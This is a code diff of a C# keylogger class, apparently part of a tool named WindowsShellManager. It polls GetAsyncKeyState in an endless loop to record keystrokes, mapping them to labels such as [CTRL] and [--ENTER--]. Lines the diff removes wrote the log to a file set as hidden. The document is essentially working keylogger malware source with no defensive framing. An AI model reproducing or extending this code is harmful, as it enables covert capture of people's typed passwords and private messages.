@@ -8,24 +8,16 @@ namespace WindowsShellManager.features
 {
     class KeyLogger
     {
-        
+
 
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
         internal static string KeyLog;
 
 
-        internal void Start(string filePath)
+        internal void Start()
         {
-            if (File.Exists(filePath))
-            {
-                File.SetAttributes(filePath, FileAttributes.Hidden);
-                StreamWriter file = new StreamWriter(filePath, true);
-                file.WriteLine();
-                file.Write("||" + System.DateTime.Now + "||");
-                file.WriteLine();
-                file.Close();
-            };
+
 
             while (true)
             {
@@ -47,7 +39,7 @@ namespace WindowsShellManager.features
             if (code <= 6 && code > 0) key = "";
             else if (code == 8) key = "[Back]";
             else if (code == 9) key = "[TAB]";
-            else if (code == 13) key = System.Environment.NewLine + "[--ENTER--]";
+            else if (code == 13) key = "[--ENTER--]" + System.Environment.NewLine;
             else if (code == 16) key = "[MODIFIED]";
             else if (code == 17) key = "[CTRL]";
             else if (code == 18) key = "[TAB]";
